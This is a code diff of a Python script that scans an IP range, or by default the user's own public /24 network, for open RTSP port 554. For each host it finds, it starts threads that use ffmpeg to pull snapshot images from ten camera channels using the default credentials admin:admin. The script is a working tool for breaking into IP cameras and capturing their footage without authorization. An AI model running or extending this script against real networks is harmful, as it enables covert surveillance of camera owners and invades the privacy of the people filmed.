@@ -12,23 +12,25 @@ def openPort(target):
 
     if result == 0:
         print(target + " - OPEN")
-        listIP.append(result)
-        exploitRstp(target)
+        t_exploitRstp = Thread(target=exploitRstp, args=[target])
+        t_exploitRstp.start()
 
 def exploitRstp(ip):
-    cam = 'cam-' + ip + '.jpeg'
     for i in range(10):
+        print('Passou aqui?')
         command = ("rtsp://admin:admin@{0}:554/cam/realmonitor?channel={1}&subtype=0".format(ip, i+1))
+        cam = 'cam-{0}-{1}.jpeg &'.format(ip, i+1)
         subprocess.Popen(['/usr/bin/ffmpeg', '-i', command, '-f', 'image2', cam], stdout=subprocess.PIPE)
 
 if __name__ == '__main__':
     try:
-        import sys
         import socket
         import ipcalc
         import subprocess
         import re
         import argparse
+        import requests
+        from threading import Thread
 
         parser = argparse.ArgumentParser(description='Change options for execute the Script',
                                          prefix_chars='--')
@@ -46,6 +48,13 @@ if __name__ == '__main__':
             network = result.target
             for ip in ipcalc.Network(network):
                 openPort(str(ip))
+
+        if result.target == None:
+            network = '{0}/24'.format(requests.get('https://ipapi.co/ip/').text)
+            print('Scanning your Network "/24" - ' + network)
+            for ip in ipcalc.Network(network):
+                openPort(str(ip))
+
         else:
             print("Please enter the valid option")
 
